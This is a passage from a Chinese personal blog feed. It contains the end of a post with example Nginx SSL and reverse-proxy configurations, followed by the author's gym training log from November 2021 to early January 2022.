class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">http&#123;</span><br><span class="line">#http节点中可以添加多个server节点</span><br><span class="line">server&#123;</span><br><span class="line">    #ssl 需要监听443端口</span><br><span class="line">    listen 443;</span><br><span class="line">    # CA证书对应的域名</span><br><span class="line">    server_name www.ilovey.live;</span><br><span class="line">    # 开启ssl</span><br><span class="line">    ssl on;</span><br><span class="line">    # 服务器证书绝对路径</span><br><span class="line">    ssl_certificate /www/server/nginx/conf.d/4467149_www.ilovey.live.pem;</span><br><span class="line">    # 服务器端证书key绝对路径 </span><br><span class="line">    ssl_certificate_key /www/server/nginx/conf.d/4467149_www.ilovey.live.key;</span><br><span class="line">    # session超时</span><br><span class="line">    ssl_session_timeout 5m;</span><br><span class="line">    # 协议类型</span><br><span class="line">    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">    # ssl算法列表 </span><br><span class="line">    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;</span><br><span class="line">    #  是否 服务器决定使用哪种算法  on/off   TLSv1.1 的话需要开启</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line">    </span><br><span class="line">    location ^~  /zhihao/ &#123;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_pass http://127.0.0.1:8080/;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># 如果用户通过 http 访问 直接重写 跳转到 https 这个是一个很有必要的操作</span><br><span class="line">server&#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.ilovey.live;</span><br><span class="line">    rewrite ^/(.*)$ https://www.ilovey.live:443/$1 permanent;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="nginx配置ssl证书示例2"><a href="#nginx配置ssl证书示例2" class="headerlink" title="nginx配置ssl证书示例2"></a>nginx配置ssl证书示例2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">listen 80;</span><br><span class="line">listen 443 ssl http2;</span><br><span class="line">server_name ilovey.live;</span><br><span class="line">index index.php index.html index.htm default.php default.htm default.html;</span><br><span class="line">root /www/wwwroot/网站目录;</span><br><span class="line"></span><br><span class="line">#SSL-START SSL相关配置，请勿删除或修改下一行带注释的404规则</span><br><span class="line">#error_page 404/404.html;</span><br><span class="line">ssl_certificate    /www/server/nginx/conf.d/4467149_www.ilovey.live.pem;</span><br><span class="line">ssl_certificate_key    /www/server/nginx/conf.d/4467149_www.ilovey.live.key;</span><br><span class="line">ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;</span><br><span class="line">ssl_prefer_server_ciphers on;</span><br><span class="line">ssl_session_cache shared:SSL:10m;</span><br><span class="line">ssl_session_timeout 10m;</span><br><span class="line">error_page 497  https://$host$request_uri;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#SSL-END</span><br><span class="line"></span><br><span class="line">#ERROR-PAGE-START  错误页配置，可以注释、删除或修改</span><br><span class="line">#error_page 404 /404.html;</span><br><span class="line">#error_page 502 /502.html;</span><br><span class="line">#ERROR-PAGE-END</span><br><span class="line"></span><br><span class="line">#PHP-INFO-START  PHP引用配置，可以注释或修改</span><br><span class="line"></span><br><span class="line">#PROXY-START</span><br><span class="line">location /</span><br><span class="line">&#123;</span><br><span class="line">    proxy_pass http://localhost:8886;</span><br><span class="line">    proxy_set_header Host $host;</span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_set_header REMOTE-HOST $remote_addr;</span><br><span class="line"></span><br><span class="line">    #持久化连接相关配置</span><br><span class="line">    #proxy_connect_timeout 30s;</span><br><span class="line">    #proxy_read_timeout 86400s;</span><br><span class="line">    #proxy_send_timeout 30s;</span><br><span class="line">    #proxy_http_version 1.1;</span><br><span class="line">    #proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">    #proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">    ##expires 12h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#PHP-INFO-END</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#禁止访问的文件或目录</span><br><span class="line">location ~ ^/(\.user.ini|\.htaccess|\.git|\.svn|\.project|LICENSE|README.md)</span><br><span class="line">&#123;</span><br><span class="line">    return 404;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#一键申请SSL证书验证目录相关设置</span><br><span class="line">location ~ \.well-known&#123;</span><br><span class="line">    allow all;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安装-Nginx&quot;&gt;&lt;a href=&quot;#安装-Nginx&quot; class=&quot;headerlink&quot; title=&quot;安装 Nginx&quot;&gt;&lt;/a&gt;安装 Nginx&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl
      
    
    </summary>
    
    
      <category term="Nginx" scheme="https://blog.smilexin.cn/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>健身记录_202111-202201</title>
    <link href="https://blog.smilexin.cn/2021/11/08/%E5%81%A5%E8%BA%AB%E8%AE%B0%E5%BD%95_202111-202201.html"/>
    <id>https://blog.smilexin.cn/2021/11/08/健身记录_202111-202201.html</id>
    <published>2021-11-07T16:00:00.000Z</published>
    <updated>2022-02-02T13:36:40.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021-11-08-星期一（肩-腹肌）"><a href="#2021-11-08-星期一（肩-腹肌）" class="headerlink" title="2021-11-08 星期一（肩+腹肌）"></a>2021-11-08 星期一（肩+腹肌）</h1><p>练前肌酸3g，练后肌酸3g</p><ul><li>坐姿哑铃推肩<ul><li>12kg 12 12</li><li>16kg 8 7 6 5</li></ul></li><li>器械推肩10.4kg 8 8 9 11</li><li>哑铃侧平举6kg 12 12 12 12 10</li><li>后仰高位下拉（肩后束）<ul><li>18kg 14</li><li>23kg 12 12 12 12</li></ul></li><li>蝴蝶机练后束18kg 12 12 12 12</li><li>侧腹转身23kg 12 8 8 9</li><li>负重卷腹36kg 12 17 14 14</li></ul><h1 id="2021-11-09-星期二（胸-腹肌）"><a href="#2021-11-09-星期二（胸-腹肌）" class="headerlink" title="2021-11-09 星期二（胸+腹肌）"></a>2021-11-09 星期二（胸+腹肌）</h1><p>早上肌酸3g，练前肌酸3g，练后肌酸3g</p><ul><li>蝴蝶机夹胸32kg 8 8 9 8</li><li>平板杠铃卧推<ul><li>30kg 9</li><li>50kg 5 5 5 4 2</li></ul></li><li>哑铃上斜卧推<ul><li>16kg 8</li><li>18kg 8 8 6 5</li></ul></li><li>器械推胸16.8kg 8 8 8 7</li><li>双杠臂屈伸<ul><li>50kg↑ 8 8 8</li><li>63kg↑ 9 9 11 10</li></ul></li><li>交替侧腹抬腿16 16 16 16</li></ul><h1 id="2021-11-10-星期三（腿）"><a href="#2021-11-10-星期三（腿）" class="headerlink" title="2021-11-10 星期三（腿）"></a>2021-11-10 星期三（腿）</h1><p>早上肌酸3g，练前肌酸3g，练后肌酸3g</p><ul><li>倒蹬<ul><li>40kg 10</li><li>90kg 6 8 8 9</li></ul></li><li>坐姿腿屈伸23kg 8 12 12 12</li><li>哑铃箭步蹲10kg 10 5 6 8</li></ul><h1 id="2021-11-11-星期四（腹肌）"><a href="#2021-11-11-星期四（腹肌）" class="headerlink" title="2021-11-11 星期四（腹肌）"></a>2021-11-11 星期四（腹肌）</h1><p>早上肌酸3g，练后肌酸3g</p><ul><li>卷腹 13 13 13 15 15</li><li>负重卷腹5kg 8 8 10 11</li><li>侧腹转身23kg 8 12 12 12</li></ul><h1 id="2021-11-12-星期五（背）"><a href="#2021-11-12-星期五（背）" class="headerlink" title="2021-11-12 星期五（背）"></a>2021-11-12 星期五（背）</h1><p>早上肌酸3g，练前肌酸3g</p><ul><li>高位下拉<ul><li>23kg 12</li><li>27kg 9 8 9 9</li></ul></li><li>助力引体23kg 4 6 4.5 3.5 2</li><li>直臂下压32kg 6 6 6 6</li><li>单臂划船<ul><li>25kg 9 9</li><li>30kg 6 6 6 6</li></ul></li><li>窄距划船<ul><li>39kg 8</li><li>45kg 4.6 4.5 4.3 4</li></ul></li><li>杠杆高位下拉35kg 8 8 8 8</li></ul><h1 id="2021-11-13-星期六（胸）"><a href="#2021-11-13-星期六（胸）" class="headerlink" title="2021-11-13 星期六（胸）"></a>2021-11-13 星期六（胸）</h1><p>练前肌酸3g</p><ul><li>蝴蝶机夹胸 32kg 10 10 9 8</li><li>平板杠铃卧推<ul><li>20kg 12</li><li>30kg 9</li><li>50kg 5 4 4 4</li></ul></li><li>哑铃上斜卧推<ul><li>18kg 8 </li><li>20kg 5 6 5 4</li></ul></li><li>双杠臂屈伸59kg 12 13 13 12</li><li>器械推胸16.8kg 6 6 6 6</li></ul><h1 id="2021-11-15-星期一（肩-腹肌）"><a href="#2021-11-15-星期一（肩-腹肌）" class="headerlink" title="2021-11-15 星期一（肩+腹肌）"></a>2021-11-15 星期一（肩+腹肌）</h1><ul><li>坐姿哑铃推肩<ul><li>12kg 12 12</li><li>16kg 8 8 8 6</li></ul></li><li>器械推肩10.4kg 10 9 10 11</li><li>哑铃侧平举8kg 15 12 12 12 8</li><li>后仰高位下拉（肩后束）23kg 12 12 12 12 12</li><li>卷腹 15 15 15 15</li></ul><h1 id="2021-11-16-星期二（背-腹肌）"><a href="#2021-11-16-星期二（背-腹肌）" class="headerlink" title="2021-11-16 星期二（背+腹肌）"></a>2021-11-16 星期二（背+腹肌）</h1><ul><li>助力引体23kg 6 6 6 4 2.2</li><li>直臂下压32kg 6 6 6 6</li><li>单臂划船25kg 8 8 8 8</li><li>高位下拉32kg 8 10 9 9</li><li>窄距划船<ul><li>45kg 5 5 5 5</li><li>39kg 5 6</li></ul></li><li>杠杆高位下拉35kg 10 10 10 10</li><li>卷腹 14 7 5 3</li></ul><h1 id="2021-11-17-星期三-（胸）"><a href="#2021-11-17-星期三-（胸）" class="headerlink" title="2021-11-17 星期三 （胸）"></a>2021-11-17 星期三 （胸）</h1><ul><li>蝴蝶机夹胸 32kg 12 12 8 8</li><li>平板杠铃卧推<ul><li>20kg 10</li><li>30kg 9</li><li>50kg 5 6 4 4</li></ul></li><li>哑铃上斜卧推20kg 6 6 5 5</li><li>器械平板卧推单边<ul><li>14.5kg 8</li><li>19.5kg 8 5 6 3.5</li></ul></li><li>双杠臂屈伸（下胸）59kg⬆ 10 10 12 12</li></ul><h1 id="2021-11-18-星期四（腿）"><a href="#2021-11-18-星期四（腿）" class="headerlink" title="2021-11-18 星期四（腿）"></a>2021-11-18 星期四（腿）</h1><ul><li>深蹲<ul><li>20kg 11</li><li>40kg 8</li><li>60kg 6 5 5 5</li></ul></li><li>倒蹬70kg 8 8 8 9</li><li>俯身腿屈伸27kg 12 12 12 12</li><li>坐姿夹腿<ul><li>27kg 15 16</li><li>32kg 15 15 15 15</li></ul></li></ul><h1 id="2021-11-19-星期五（手臂）"><a href="#2021-11-19-星期五（手臂）" class="headerlink" title="2021-11-19 星期五（手臂）"></a>2021-11-19 星期五（手臂）</h1><ul><li>坐姿哑铃推肩<ul><li>12kg 12 13</li><li>16kg 8 8 6</li></ul></li><li>牧师凳曲杆弯举20kg 5 8 6 6</li><li>双杠臂屈伸 9 9 8 8</li><li>哑铃交替弯举10kg 9 6 5</li><li>龙门架二头弯举23kg 9 8 9 9 10</li><li>高位下拉（肩后束）23kg 8 9 10 12</li></ul><h1 id="2021-11-22-星期一（胸）"><a href="#2021-11-22-星期一（胸）" class="headerlink" title="2021-11-22 星期一（胸）"></a>2021-11-22 星期一（胸）</h1><ul><li>蝴蝶机夹胸32kg 12 12 12 8</li><li>哑铃上斜卧推<ul><li>14kg 12</li><li>20kg 8 8 6 5</li></ul></li><li>平板杠铃卧推<ul><li>20kg 10</li><li>50kg 3</li><li>45kg 5 5 5 4</li></ul></li><li>器械推下胸41kg 8 8 8 8</li><li>双杠臂屈伸（下胸）59kg⬆ 11 12 10 12</li></ul><h1 id="2021-11-23-星期二（背）"><a href="#2021-11-23-星期二（背）" class="headerlink" title="2021-11-23 星期二（背）"></a>2021-11-23 星期二（背）</h1><ul><li>辅助引体向上23kg⬆ 6 6 6 5</li><li>直臂下压27kg 9 9 8 8</li><li>单臂器械划船<ul><li>20kg 8</li><li>30kg 6 6 8 8</li></ul></li><li>窄距对喔划船45kg 6 6 6 6</li><li>重锤高位下拉35kg 8 8 8 10 8</li></ul><h1 id="2021-11-24-星期三（腿）"><a href="#2021-11-24-星期三（腿）" class="headerlink" title="2021-11-24 星期三（腿）"></a>2021-11-24 星期三（腿）</h1><ul><li>哈克深蹲<ul><li>40kg 12</li><li>90kg 8 8 9 8</li></ul></li><li>俯身腿屈伸32kg 12 8 8 10 8</li><li>坐姿夹腿36kg 8 10 11 10 12</li><li>坐姿蹬腿78kg 8 8 10 13</li></ul><h1 id="2021-11-25-星期四（肩-腹肌）"><a href="#2021-11-25-星期四（肩-腹肌）" class="headerlink" title="2021-11-25 星期四（肩+腹肌）"></a>2021-11-25 星期四（肩+腹肌）</h1><ul><li>坐姿杠铃推举<ul><li>20kg 8 10</li><li>25kg 8 8 8 8</li></ul></li><li>坐姿哑铃推肩16kg 6 6 5 6</li><li>哑铃侧平举<ul><li>8kg 15 15 10 9 </li><li>6kg 6 9</li></ul></li><li>蝴蝶机练肩后束27kg 8 8 8 9 6</li><li>高位下拉（肩后束）27kg 12 12 12 12</li><li>卷腹 12 5 9 7</li></ul><h1 id="2021-11-26-星期五（胸）"><a href="#2021-11-26-星期五（胸）" class="headerlink" title="2021-11-26 星期五（胸）"></a>2021-11-26 星期五（胸）</h1><ul><li>蝴蝶机夹胸32kg 12 12 8 8</li><li>平板杠铃卧推<ul><li>20kg 12</li><li>40kg 10 8</li><li>50kg 4 4 4 3</li></ul></li><li>哑铃上斜卧推20kg 7 6 6 4 5</li><li>双杠臂屈伸（下胸）<ul><li>59kg⬆ 12</li><li>54kg⬆ 12 12 9 8</li></ul></li></ul><h1 id="2021-11-29-星期一（背）"><a href="#2021-11-29-星期一（背）" class="headerlink" title="2021-11-29 星期一（背）"></a>2021-11-29 星期一（背）</h1><ul><li>辅助引体向上23kg 6 6 6 4.5 2</li><li>直臂下压27kg 8 9 8 8</li><li>单臂器械划船<ul><li>20kg 8</li><li>30kg 8 8 8 8</li></ul></li><li>窄距对喔划船45kg 6 6 6 6</li><li>窄距对喔高位下拉32kg 8 8 8 8</li></ul><h1 id="2021-11-30-星期二（腿）"><a href="#2021-11-30-星期二（腿）" class="headerlink" title="2021-11-30 星期二（腿）"></a>2021-11-30 星期二（腿）</h1><ul><li>杠铃深蹲<ul><li>20kg 8 10</li><li>40kg 8</li><li>50kg 8</li><li>55kg 8 6 6 6</li></ul></li><li>俯身腿屈伸32kg 12 12 8 8</li><li>坐姿夹腿36kg 13 12 12 12</li></ul><h1 id="2021-12-01-星期三（胸）"><a href="#2021-12-01-星期三（胸）" class="headerlink" title="2021-12-01 星期三（胸）"></a>2021-12-01 星期三（胸）</h1><ul><li>蝴蝶机夹胸32kg 9 8 8 8</li><li>平板杠铃卧推<ul><li>20kg 8 8</li><li>40kg 8</li><li>50kg 5 5 5 3 3</li></ul></li><li>哑铃上斜卧推20kg 8 6 5 5</li><li>固定器械推下胸41kg 8 8 7 6</li><li>双杠臂屈伸（下胸）59kg⬆ 12 11 10 10</li></ul><h1 id="2021-12-02-星期四（背）"><a href="#2021-12-02-星期四（背）" class="headerlink" title="2021-12-02 星期四（背）"></a>2021-12-02 星期四（背）</h1><ul><li>传统硬拉40kg 3 3 4 4</li><li>俯身杠铃划船<ul><li>40kg 12 13</li><li>45kg 9 12 11 11</li></ul></li><li>窄距对握划船45kg 7 8 6 6</li><li>重锤高位下拉40kg 8 8 8 8</li></ul><h1 id="2021-12-03-星期五（二头）"><a href="#2021-12-03-星期五（二头）" class="headerlink" title="2021-12-03 星期五（二头）"></a>2021-12-03 星期五（二头）</h1><p>使用第三方APP记录，导致锻炼数据丢失</p><h1 id="2021-12-05-星期天（胸）"><a href="#2021-12-05-星期天（胸）" class="headerlink" title="2021-12-05 星期天（胸）"></a>2021-12-05 星期天（胸）</h1><ul><li>蝴蝶机夹胸32kg 12 8 8 8</li><li>平板杠铃卧推<ul><li>20kg 9</li><li>40kg 9</li><li>50kg 6 6 4 3</li><li>40kg 6</li></ul></li><li>哑铃上斜卧推20kg 6 6 5 5</li><li>器械推胸<ul><li>6.8kg 8</li><li>21.8kg 6 4.5 4.5 4</li><li>16.8kg 6</li></ul></li><li>双杠臂屈伸（下胸）54kg⬆ 9 9 8 8 6</li></ul><h1 id="2021-12-06-星期一（腿）"><a href="#2021-12-06-星期一（腿）" class="headerlink" title="2021-12-06 星期一（腿）"></a>2021-12-06 星期一（腿）</h1><ul><li>杠铃深蹲<ul><li>20kg 10</li><li>40kg 8</li><li>60kg 5 5 5 5</li></ul></li><li>倒蹬90kg 7 8 8 8</li><li>附身腿屈伸32kg 8 12 9 10</li><li>坐姿夹腿36kg 12 12 12 12</li></ul><h1 id="2021-12-07-星期二（肩）"><a href="#2021-12-07-星期二（肩）" class="headerlink" title="2021-12-07 星期二（肩）"></a>2021-12-07 星期二（肩）</h1><ul><li>坐姿哑铃推肩<ul><li>8kg 8</li><li>12kg 12</li><li>16kg 12</li><li>18kg 8 7 6 6</li></ul></li><li>器械推肩15.4kg 6 6 6 6</li><li>哑铃侧平举<ul><li>8kg 15 12 12 10</li><li>6kg 6</li><li>4kg 6</li><li>2kg 8</li></ul></li><li>高位下拉（肩后束）<ul><li>27kg 12 12</li><li>32kg 10 8 8</li></ul></li><li>蝴蝶机练后束 27kg 6 6 6 5</li></ul><h1 id="2021-12-08-星期三（背）"><a href="#2021-12-08-星期三（背）" class="headerlink" title="2021-12-08 星期三（背）"></a>2021-12-08 星期三（背）</h1><ul><li>辅助引体向上23kg 6 6 6 5</li><li>直臂下压27kg 8 8 8 8</li><li>宽距对喔器械划船<ul><li>27kg 12 12</li><li>32kg 10</li><li>39kg 8 7.7 7.7 8</li></ul></li><li>窄距对喔划船39kg 6 6 7 7.7</li><li>单臂器械划船25kg 8 9 9 9</li><li>重锤高位下拉40kg 8 6 6 6 6.5</li></ul><h1 id="2021-12-09-星期四（胸，背）"><a href="#2021-12-09-星期四（胸，背）" class="headerlink" title="2021-12-09 星期四（胸，背）"></a>2021-12-09 星期四（胸，背）</h1><ul><li>器械推胸27kg 20</li><li>平板杠铃卧推<ul><li>20kg 12</li><li>40kg 8</li><li>50kg 6 6 5 3 3</li></ul></li><li>哑铃上斜卧推20kg 8 6 6 4 3</li><li>器械推胸16.8kg 8 8 8 8</li><li>双杠臂屈伸（下胸）59kg⬆ 9 10 10 10</li><li>蝴蝶机夹胸<ul><li>32kg 6 3</li><li>23kg 6 7 7</li></ul></li><li>器械划船<ul><li>32kg 12</li><li>41kg 8 8 8 8</li><li>32kg 6</li></ul></li></ul><h1 id="2021-12-10-星期五（有氧）"><a href="#2021-12-10-星期五（有氧）" class="headerlink" title="2021-12-10 星期五（有氧）"></a>2021-12-10 星期五（有氧）</h1><ul><li>坡度快走40分钟</li></ul><h1 id="2021-12-11-星期六（肩）"><a href="#2021-12-11-星期六（肩）" class="headerlink" title="2021-12-11 星期六（肩）"></a>2021-12-11 星期六（肩）</h1><ul><li>坐姿哑铃推肩<ul><li>10kg 12 12</li><li>14kg 9</li><li>16kg 9</li><li>18kg 6 6 6 6</li></ul></li><li>器械推肩<ul><li>10.4kg 12</li><li>15.4kg 6 6 6 7</li></ul></li><li>哑铃侧平举<ul><li>8kg 12 12 12 14</li><li>6kg 5</li><li>4kg 8</li><li>2kg 12</li></ul></li><li>高位下拉（肩后束）<ul><li>27kg 12 </li><li>32kg 12 8 8 8</li></ul></li><li>蝴蝶机练后束27kg 7 8 7 8</li></ul><h1 id="2021-12-13-星期一（背）"><a href="#2021-12-13-星期一（背）" class="headerlink" title="2021-12-13 星期一（背）"></a>2021-12-13 星期一（背）</h1><ul><li>辅助引体向上23kg 6 6 6 4 3</li><li>高位下拉39kg 6 6 6 7</li><li>直臂下压23kg 12 12 12 10</li><li>窄距对喔划船45kg 6 7 6 6 6</li><li>器械划船<ul><li>32kg 7</li><li>41kg 8 8 9 9</li></ul></li><li>重锤高位下拉40kg 8 8 7.8 7.8</li></ul><h1 id="2021-12-14-星期二（胸）"><a href="#2021-12-14-星期二（胸）" class="headerlink" title="2021-12-14 星期二（胸）"></a>2021-12-14 星期二（胸）</h1><ul><li>蝴蝶机夹胸32kg 10 9 8 8</li><li>平板杠铃卧推<ul><li>20kg 13</li><li>40kg 8</li><li>50kg 5 5 5 5</li></ul></li><li>哑铃上斜卧推20kg 7 6 6 5 4</li><li>器械推胸<ul><li>16.8kg 8</li><li>21.8kg 6 6 6 5</li></ul></li><li>固定器械推下胸41kg 6</li><li>双杠臂屈伸（下胸）54kg 8 8 8 9</li></ul><h1 id="2021-12-17-星期五（肩）"><a href="#2021-12-17-星期五（肩）" class="headerlink" title="2021-12-17 星期五（肩）"></a>2021-12-17 星期五（肩）</h1><ul><li>坐姿哑铃推肩<ul><li>10kg 13</li><li>12kg 10</li><li>16kg 10</li><li>18kg 8</li><li>20kg 5 6 6 4</li><li>18kg 4</li></ul></li><li>器械推肩15.4kg 8 7 7 6</li><li>哑铃侧平举<ul><li>8kg 15 13 12 12</li><li>4kg 5</li><li>2kg 12</li></ul></li><li>高位下拉（肩后束）27kg 10 14 12 12</li><li>蝴蝶机练后束27kg 10 8 8 8</li></ul><h1 id="2021-12-20-星期一（胸）"><a href="#2021-12-20-星期一（胸）" class="headerlink" title="2021-12-20 星期一（胸）"></a>2021-12-20 星期一（胸）</h1><ul><li>蝴蝶机夹胸32kg 9 8 8 8</li><li>平板杠铃卧推<ul><li>20kg 15</li><li>40kg 9</li><li>50kg 5 5 5 5</li></ul></li><li>哑铃上斜卧推20kg 6 6 6 6 3</li><li>固定器械推下胸36kg 8 8 8 8</li><li>双杠臂屈伸（下胸）54kg 8 8 8 8</li></ul><h1 id="2021-12-21-星期二（背）"><a href="#2021-12-21-星期二（背）" class="headerlink" title="2021-12-21 星期二（背）"></a>2021-12-21 星期二（背）</h1><ul><li>辅助引体向上23kg 6 6 6 6</li><li>单臂划船<ul><li>15kg 10</li><li>25kg 8</li><li>27.5kg 8</li><li>30kg 8 8 8 8</li></ul></li><li>窄距对喔划船45kg 7 6 6 6</li><li>器械划船41kg 6 6 6 7</li><li>重锤高位下拉45kg 8 7 6 6</li></ul><h1 id="2021-12-22-星期三（有氧）"><a href="#2021-12-22-星期三（有氧）" class="headerlink" title="2021-12-22 星期三（有氧）"></a>2021-12-22 星期三（有氧）</h1><ul><li>坡度快走40分钟</li></ul><h1 id="2021-12-23-星期四（有氧）"><a href="#2021-12-23-星期四（有氧）" class="headerlink" title="2021-12-23 星期四（有氧）"></a>2021-12-23 星期四（有氧）</h1><ul><li>单车20分钟</li></ul><h1 id="2021-12-24-星期五（胸）"><a href="#2021-12-24-星期五（胸）" class="headerlink" title="2021-12-24 星期五（胸）"></a>2021-12-24 星期五（胸）</h1><ul><li>蝴蝶机夹胸32kg 11 8 8 8</li><li>平板杠铃卧推<ul><li>20kg 15</li><li>40kg 8 8</li><li>50kg 5 5 3 4</li></ul></li><li>哑铃上斜卧推20kg 6 6 6 5</li><li>固定器械推胸41kg 7 7 7 6</li><li>双杠臂屈伸（下胸）54kg 8 8 8 9 7</li></ul><h1 id="2021-12-26-星期天（背）"><a href="#2021-12-26-星期天（背）" class="headerlink" title="2021-12-26 星期天（背）"></a>2021-12-26 星期天（背）</h1><ul><li>宽引体向上14kg 6 6 5.2 3 2</li><li>直臂下拉<ul><li>23kg 8 8</li><li>27kg 8 8 7 6.6</li></ul></li><li>单臂划船35kg 6 6 6 6</li><li>窄距对喔划船45kg 8 6 6 6</li><li>重锤高位下拉<ul><li>40kg 8 </li><li>45kg 6 6 6 6</li></ul></li><li>器械划船<ul><li>27kg 8</li><li>32kg 8 9 9<h1 id="2021-12-27-星期一（有氧）"><a href="#2021-12-27-星期一（有氧）" class="headerlink" title="2021-12-27 星期一（有氧）"></a>2021-12-27 星期一（有氧）</h1></li></ul></li><li>坡度快走40分钟<h1 id="2021-12-28-星期二（胸）"><a href="#2021-12-28-星期二（胸）" class="headerlink" title="2021-12-28 星期二（胸）"></a>2021-12-28 星期二（胸）</h1></li><li>蝴蝶机夹胸32kg 8 8 8 8</li><li>平板杠铃卧推<ul><li>20kg 20</li><li>40kg 8</li><li>50kg 5 </li><li>52.5kg 4 3 2 3</li><li>40kg 6</li></ul></li><li>哑铃上斜卧推20kg 6 6 6 4 3</li><li>器械推胸16.8kg 8 8 8 8</li><li>固定器械推胸41kg 7 6 6 5</li><li>双杠臂屈伸（下胸）54kg 7 9 8 8 8</li><li>器械划船<ul><li>36kg 10</li><li>41kg 8 8 8 8 8</li></ul></li></ul><h1 id="2021-12-29-星期三（肩）"><a href="#2021-12-29-星期三（肩）" class="headerlink" title="2021-12-29 星期三（肩）"></a>2021-12-29 星期三（肩）</h1><ul><li>坐姿哑铃推肩<ul><li>8kg 14</li><li>12kg 12</li><li>14kg 10</li><li>18kg 8</li><li>20kg 6 6 6 6</li></ul></li><li>器械推肩15.4kg 6 6 7 7</li><li>哑铃侧平举<ul><li>8kg 12 13 12 12</li><li>4kg 6</li><li>2kg 8</li></ul></li><li>高位下拉（肩后束）<ul><li>27kg 12</li><li>32kg 12 8 8 9</li></ul></li><li>蝴蝶机练后束27kg 8 8 8 8</li></ul><h1 id="2021-12-30-星期四（有氧）"><a href="#2021-12-30-星期四（有氧）" class="headerlink" title="2021-12-30 星期四（有氧）"></a>2021-12-30 星期四（有氧）</h1><ul><li>慢走40分钟</li><li>杠铃划船40kg 10 10 10 9</li></ul><h1 id="2021-12-31-星期五（背）"><a href="#2021-12-31-星期五（背）" class="headerlink" title="2021-12-31 星期五（背）"></a>2021-12-31 星期五（背）</h1><h2 id="第一次训练"><a href="#第一次训练" class="headerlink" title="第一次训练"></a>第一次训练</h2><ul><li>宽距引体向上<ul><li>14kg 6 6 5.5 3.8</li><li>27kg 4</li></ul></li><li>高位下拉中距对握32kg 8 9 8 9</li><li>器械划船45kg 8 8 8 8</li><li>单臂划船35kg 8 8 8 8</li><li>重锤高位下拉45kg 6 6 6 6</li></ul><h2 id="第二次训练"><a href="#第二次训练" class="headerlink" title="第二次训练"></a>第二次训练</h2><ul><li>传统硬拉<ul><li>40kg 7 8</li><li>45kg 6 6 6 6</li></ul></li></ul><h1 id="2022-01-02（胸）"><a href="#2022-01-02（胸）" class="headerlink" title="2022-01-02（胸）"></a>2022-01-02（胸）</h1><ul><li>蝴蝶机夹胸32kg 8 8 8 6</li><li>上斜哑铃卧推20kg 8 8 8 6</li><li>杠铃平板卧推<ul><li>20kg 8</li><li>50kg 5 4 3 3 4</li></ul></li><li>器械平板卧推24.5kg 7 4 3 4</li><li>双杠臂屈伸（下胸）54kg 11 11 9 9 8</li><li>绳索下拉（三头）<ul><li>23kg 8</li><li>27kg 6 6 5 5</li><li>23kg 3</li></ul></li><li>器械推下胸<ul><li>41kg 6 3 3</li><li>27kg 8 9 9 9</li></ul></li></ul><h1 id="2022-01-04-星期二（肩）"><a href="#2022-01-04-星期二（肩）" class="headerlink" title="2022-01-04 星期二（肩）"></a>2022-01-04 星期二（肩）</h1><ul><li>坐姿哑铃推肩<ul><li>12kg 12</li><li>16kg 12</li><li>20kg 6 6 6 5 3.4</li></ul></li><li>器械推肩15.4kg 8 7 6 6</li><li>哑铃侧平举10kg 12 12 12 10 6</li><li>绳索面拉<ul><li>18kg 10</li><li>23kg 10</li><li>27kg 10</li><li>32kg 6 6 7 